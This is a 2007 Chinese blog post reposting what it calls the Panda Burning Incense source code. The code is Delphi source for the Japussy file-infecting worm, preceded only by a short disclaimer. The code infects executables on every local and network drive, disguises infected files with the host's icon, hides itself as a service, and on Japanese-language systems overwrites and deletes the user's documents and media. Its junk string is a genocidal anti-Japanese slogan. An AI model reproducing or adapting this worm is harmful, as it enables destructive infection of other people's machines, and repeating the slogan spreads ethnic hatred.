<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><link rel="stylesheet" type="text/css" href="style.css" /><title>&#29066;&#29483;&#28903;&#39321;&#28304;&#20195;&#30721;</title></head><body><h1 id="blog-Title"><a href="index.html">&#35;import &#34;Leask.h&#34;</a></h1><div id="bp"><h2 id="bp-15BAC1A170471DB_2154-Title">&#29066;&#29483;&#28903;&#39321;&#28304;&#20195;&#30721;</h2><h5 id="bp-15BAC1A170471DB_2154-publish">3/5/2007 12&#58;56&#58;18 PM</h5><div id="bp-15BAC1A170471DB_2154-content" class="blogpost">声明：
<br />以下代码为网上收集，本人不保证其真实性。
<br />调试以下代码存在数据风险，敬请留意。
<br />以下代码仅供原理分析或参考研究，禁止用于非法用途。
<br />如任何人由于以下代码的发布蒙受任何损失均不为本Space责任。
<br />
<br />Leask Huang
<br />March 5, 2007
<br />
<br /><hr />
熊猫烧香源代码：
<br />
<br />program Japussy;<br />uses<br />  Windows, SysUtils, Classes, Graphics, ShellAPI&#123;, Registry&#125;;<br />const<br />  HeaderSize = 82432;                  //病毒体的大小<br />  IconOffset = $12EB8;                 //PE文件主图标的偏移量<br />  <br />  //在我的Delphi5 SP1上面编译得到的大小，其它版本的Delphi可能不同<br />  //查找2800000020的十六进制字符串可以找到主图标的偏移量<br />   <br />&#123;<br />  HeaderSize = 38912;                  //Upx压缩过病毒体的大小<br />  IconOffset = $92BC;                  //Upx压缩过PE文件主图标的偏移量<br />  <br />  //Upx 1.24W 用法&#58; upx -9 --8086 Japussy.exe<br />&#125;<br />  IconSize   = $2E8;                   //PE文件主图标的大小--744字节<br />  IconTail   = IconOffset + IconSize;  //PE文件主图标的尾部<br />  ID         = $44444444;              //感染标记<br />  <br />  //垃圾码，以备写入<br />  Catchword = 'If a race need to be killed out, it must be Yamato. ' +<br />              'If a country need to be destroyed, it must be Japan! ' +<br />              '*** W32.Japussy.Worm.A ***';<br />&#123;$R *.RES&#125;<br />function RegisterServiceProcess(dwProcessID, dwType&#58; Integer)&#58; Integer; <br />  stdcall; external 'Kernel32.dll'; //函数声明<br />var<br />  TmpFile&#58; string;<br />  Si&#58;      STARTUPINFO;<br />  Pi&#58;      PROCESS_INFORMATION;<br />  IsJap&#58;   Boolean = False; //日文操作系统标记<br />&#123; 判断是否为Win9x &#125;<br />function IsWin9x&#58; Boolean;<br />var<br />  Ver&#58; TOSVersionInfo;<br />begin<br />  Result &#58;= False;<br />  Ver.dwOSVersionInfoSize &#58;= SizeOf(TOSVersionInfo);<br />  if not GetVersionEx(Ver) then<br />    Exit;<br />  if (Ver.dwPlatformID = VER_PLATFORM_WIN32_WINDOWS) then //Win9x<br />    Result &#58;= True;<br />end;<br />&#123; 在流之间复制 &#125;<br />procedure CopyStream(Src&#58; TStream; sStartPos&#58; Integer; Dst&#58; TStream;<br />  dStartPos&#58; Integer; Count&#58; Integer);<br />var<br />  sCurPos, dCurPos&#58; Integer;<br />begin<br />  sCurPos &#58;= Src.Position;<br />  dCurPos &#58;= Dst.Position;<br />  Src.Seek(sStartPos, 0);<br />  Dst.Seek(dStartPos, 0);<br />  Dst.CopyFrom(Src, Count);<br />  Src.Seek(sCurPos, 0);<br />  Dst.Seek(dCurPos, 0);<br />end;<br />&#123; 将宿主文件从已感染的PE文件中分离出来，以备使用 &#125;<br />procedure ExtractFile(FileName&#58; string);<br />var<br />  sStream, dStream&#58; TFileStream;<br />begin<br />  try<br />    sStream &#58;= TFileStream.Create(ParamStr(0), fmOpenRead or fmShareDenyNone);<br />    try<br />      dStream &#58;= TFileStream.Create(FileName, fmCreate);<br />      try<br />        sStream.Seek(HeaderSize, 0); //跳过头部的病毒部分<br />        dStream.CopyFrom(sStream, sStream.Size - HeaderSize);<br />      finally<br />        dStream.Free;<br />      end;<br />    finally<br />      sStream.Free;<br />    end;<br />  except<br />  end;<br />end;<br />&#123; 填充STARTUPINFO结构 &#125;<br />procedure FillStartupInfo(var Si&#58; STARTUPINFO; State&#58; Word);<br />begin<br />  Si.cb &#58;= SizeOf(Si);<br />  Si.lpReserved &#58;= nil;<br />  Si.lpDesktop &#58;= nil;<br />  Si.lpTitle &#58;= nil;<br />  Si.dwFlags &#58;= STARTF_USESHOWWINDOW;<br />  Si.wShowWindow &#58;= State;<br />  Si.cbReserved2 &#58;= 0;<br />  Si.lpReserved2 &#58;= nil;<br />end;<br />&#123; 发带毒邮件 &#125;<br />procedure SendMail;<br />begin<br />  //哪位仁兄愿意完成之？<br />end;<br />&#123; 感染PE文件 &#125;<br />procedure InfectOneFile(FileName&#58; string);<br />var<br />  HdrStream, SrcStream&#58; TFileStream;<br />  IcoStream, DstStream&#58; TMemoryStream;<br />  iID&#58; LongInt;<br />  aIcon&#58; TIcon;<br />  Infected, IsPE&#58; Boolean;<br />  i&#58; Integer;<br />  Buf&#58; array[0..1] of Char;<br />begin<br />  try //出错则文件正在被使用，退出<br />    if CompareText(FileName, 'JAPUSSY.EXE') = 0 then //是自己则不感染<br />      Exit;<br />    Infected &#58;= False;<br />    IsPE     &#58;= False;<br />    SrcStream &#58;= TFileStream.Create(FileName, fmOpenRead);<br />    try<br />      for i &#58;= 0 to $108 do //检查PE文件头<br />      begin<br />        SrcStream.Seek(i, soFromBeginning);<br />        SrcStream.Read(Buf, 2);<br />        if (Buf[0] = #80) and (Buf[1] = #69) then //PE标记<br />        begin<br />          IsPE &#58;= True; //是PE文件<br />          Break;<br />        end;<br />      end;<br />      SrcStream.Seek(-4, soFromEnd); //检查感染标记<br />      SrcStream.Read(iID, 4);<br />      if (iID = ID) or (SrcStream.Size &lt; 10240) then //太小的文件不感染<br />        Infected &#58;= True;<br />    finally<br />      SrcStream.Free;<br />    end;<br />    if Infected or (not IsPE) then //如果感染过了或不是PE文件则退出<br />      Exit;<br />    IcoStream &#58;= TMemoryStream.Create;<br />    DstStream &#58;= TMemoryStream.Create;<br />    try<br />      aIcon &#58;= TIcon.Create;<br />      try<br />        //得到被感染文件的主图标(744字节)，存入流<br />        aIcon.ReleaseHandle;<br />        aIcon.Handle &#58;= ExtractIcon(HInstance, PChar(FileName), 0);<br />        aIcon.SaveToStream(IcoStream);<br />      finally<br />        aIcon.Free;<br />      end;<br />      SrcStream &#58;= TFileStream.Create(FileName, fmOpenRead);<br />      //头文件<br />      HdrStream &#58;= TFileStream.Create(ParamStr(0), fmOpenRead or fmShareDenyNone);<br />      try<br />        //写入病毒体主图标之前的数据<br />        CopyStream(HdrStream, 0, DstStream, 0, IconOffset);<br />        //写入目前程序的主图标<br />        CopyStream(IcoStream, 22, DstStream, IconOffset, IconSize);<br />        //写入病毒体主图标到病毒体尾部之间的数据<br />        CopyStream(HdrStream, IconTail, DstStream, IconTail, HeaderSize - IconTail);<br />        //写入宿主程序<br />        CopyStream(SrcStream, 0, DstStream, HeaderSize, SrcStream.Size);<br />        //写入已感染的标记<br />        DstStream.Seek(0, 2);<br />        iID &#58;= $44444444;<br />        DstStream.Write(iID, 4);<br />      finally<br />        HdrStream.Free;<br />      end;<br />    finally<br />      SrcStream.Free;<br />      IcoStream.Free;<br />      DstStream.SaveToFile(FileName); //替换宿主文件<br />      DstStream.Free;<br />    end;<br />  except;<br />  end;<br />end;<br /><br />&#123; 将目标文件写入垃圾码后删除 &#125;<br />procedure SmashFile(FileName&#58; string);<br />var<br />  FileHandle&#58; Integer;<br />  i, Size, Mass, Max, Len&#58; Integer;<br />begin<br />  try<br />    SetFileAttributes(PChar(FileName), 0); //去掉只读属性<br />    FileHandle &#58;= FileOpen(FileName, fmOpenWrite); //打开文件<br />    try<br />      Size &#58;= GetFileSize(FileHandle, nil); //文件大小<br />      i &#58;= 0;<br />      Randomize;<br />      Max &#58;= Random(15); //写入垃圾码的随机次数<br />      if Max &lt; 5 then<br />        Max &#58;= 5;<br />      Mass &#58;= Size div Max; //每个间隔块的大小<br />      Len &#58;= Length(Catchword);<br />      while i &lt; Max do<br />      begin<br />        FileSeek(FileHandle, i * Mass, 0); //定位<br />        //写入垃圾码，将文件彻底破坏掉<br />        FileWrite(FileHandle, Catchword, Len);<br />        Inc(i);<br />      end;<br />    finally<br />      FileClose(FileHandle); //关闭文件<br />    end;<br />    DeleteFile(PChar(FileName)); //删除之<br />  except<br />  end;<br />end;<br />&#123; 获得可写的驱动器列表 &#125;<br />function GetDrives&#58; string;<br />var<br />  DiskType&#58; Word;<br />  D&#58; Char;<br />  Str&#58; string;<br />  i&#58; Integer;<br />begin<br />  for i &#58;= 0 to 25 do //遍历26个字母<br />  begin<br />    D &#58;= Chr(i + 65);<br />    Str &#58;= D + '&#58;\';<br />    DiskType &#58;= GetDriveType(PChar(Str));<br />    //得到本地磁盘和网络盘<br />    if (DiskType = DRIVE_FIXED) or (DiskType = DRIVE_REMOTE) then<br />      Result &#58;= Result + D;<br />  end;<br />end;<br />&#123; 遍历目录，感染和摧毁文件 &#125;<br />procedure LoopFiles(Path, Mask&#58; string);<br />var<br />  i, Count&#58; Integer;<br />  Fn, Ext&#58; string;<br />  SubDir&#58; TStrings;<br />  SearchRec&#58; TSearchRec;<br />  Msg&#58; TMsg;<br />  function IsValidDir(SearchRec&#58; TSearchRec)&#58; Integer;<br />  begin<br />    if (SearchRec.Attr &lt;&gt; 16) and  (SearchRec.Name &lt;&gt; '.') and<br />      (SearchRec.Name &lt;&gt; '..') then<br />      Result &#58;= 0 //不是目录<br />    else if (SearchRec.Attr = 16) and  (SearchRec.Name &lt;&gt; '.') and<br />      (SearchRec.Name &lt;&gt; '..') then<br />        Result &#58;= 1 //不是根目录<br />    else Result &#58;= 2; //是根目录<br />  end;<br />begin<br />  if (FindFirst(Path + Mask, faAnyFile, SearchRec) = 0) then<br />  begin<br />    repeat<br />      PeekMessage(Msg, 0, 0, 0, PM_REMOVE); //调整消息队列，避免引起怀疑<br />      if IsValidDir(SearchRec) = 0 then<br />      begin<br />        Fn &#58;= Path + SearchRec.Name;<br />        Ext &#58;= UpperCase(ExtractFileExt(Fn));<br />        if (Ext = '.EXE') or (Ext = '.SCR') then<br />        begin<br />          InfectOneFile(Fn); //感染可执行文件        <br />        end<br />        else if (Ext = '.HTM') or (Ext = '.HTML') or (Ext = '.ASP') then<br />        begin<br />          //感染HTML和ASP文件，将Base64编码后的病毒写入<br />          //感染浏览此网页的所有用户<br />          //哪位大兄弟愿意完成之？<br />        end<br />        else if Ext = '.WAB' then //Outlook地址簿文件<br />        begin<br />          //获取Outlook邮件地址<br />        end<br />        else if Ext = '.ADC' then //Foxmail地址自动完成文件<br />        begin<br />          //获取Foxmail邮件地址<br />        end<br />        else if Ext = 'IND' then //Foxmail地址簿文件<br />        begin<br />          //获取Foxmail邮件地址<br />        end<br />        else <br />        begin<br />          if IsJap then //是倭文操作系统<br />          begin<br />            if (Ext = '.DOC') or (Ext = '.XLS') or (Ext = '.MDB') or<br />              (Ext = '.MP3') or (Ext = '.RM') or (Ext = '.RA') or<br />              (Ext = '.WMA') or (Ext = '.ZIP') or (Ext = '.RAR') or<br />              (Ext = '.MPEG') or (Ext = '.ASF') or (Ext = '.JPG') or<br />              (Ext = '.JPEG') or (Ext = '.GIF') or (Ext = '.SWF') or<br />              (Ext = '.PDF') or (Ext = '.CHM') or (Ext = '.AVI') then<br />                SmashFile(Fn); //摧毁文件<br />          end;<br />        end;<br />      end;<br />      //感染或删除一个文件后睡眠200毫秒，避免CPU占用率过高引起怀疑<br />      Sleep(200);<br />    until (FindNext(SearchRec) &lt;&gt; 0);<br />  end;<br />  FindClose(SearchRec);<br />  SubDir &#58;= TStringList.Create;<br />  if (FindFirst(Path + '*.*', faDirectory, SearchRec) = 0) then<br />  begin<br />    repeat<br />      if IsValidDir(SearchRec) = 1 then<br />        SubDir.Add(SearchRec.Name);<br />    until (FindNext(SearchRec) &lt;&gt; 0);<br />    end;<br />  FindClose(SearchRec);<br />  Count &#58;= SubDir.Count - 1;<br />  for i &#58;= 0 to Count do<br />    LoopFiles(Path + SubDir.Strings + '\', Mask);<br />  FreeAndNil(SubDir);<br />end;<br />&#123; 遍历磁盘上所有的文件 &#125;<br />procedure InfectFiles;<br />var<br />  DriverList&#58; string;<br />  i, Len&#58; Integer;<br />begin<br />  if GetACP = 932 then //日文操作系统<br />    IsJap &#58;= True; //去死吧！<br />  DriverList &#58;= GetDrives; //得到可写的磁盘列表<br />  Len &#58;= Length(DriverList);<br />  while True do //死循环<br />  begin<br />    for i &#58;= Len downto 1 do //遍历每个磁盘驱动器<br />      LoopFiles(DriverList + '&#58;\', '*.*'); //感染之<br />    SendMail; //发带毒邮件<br />    Sleep(1000 * 60 * 5); //睡眠5分钟<br />  end;<br />end;<br />&#123; 主程序开始 &#125;<br />begin<br />  if IsWin9x then //是Win9x<br />    RegisterServiceProcess(GetCurrentProcessID, 1) //注册为服务进程<br />  else //WinNT<br />  begin<br />    //远程线程映射到Explorer进程<br />    //哪位兄台愿意完成之？<br />  end;<br />  //如果是原始病毒体自己<br />  if CompareText(ExtractFileName(ParamStr(0)), 'Japussy.exe') = 0 then<br />    InfectFiles //感染和发邮件<br />  else //已寄生于宿主程序上了，开始工作<br />  begin<br />    TmpFile &#58;= ParamStr(0); //创建临时文件<br />    Delete(TmpFile, Length(TmpFile) - 4, 4);<br />    TmpFile &#58;= TmpFile + #32 + '.exe'; //真正的宿主文件，多一个空格<br />    ExtractFile(TmpFile); //分离之<br />    FillStartupInfo(Si, SW_SHOWDEFAULT);<br />    CreateProcess(PChar(TmpFile), PChar(TmpFile), nil, nil, True,<br />      0, nil, '.', Si, Pi); //创建新进程运行之<br />    InfectFiles; //感染和发邮件<br />  end;<br />end. <br /></div><h3>Comments</h3><div id="bp-15BAC1A170471DB_2154-comments" class="comments"></div></div></body></html>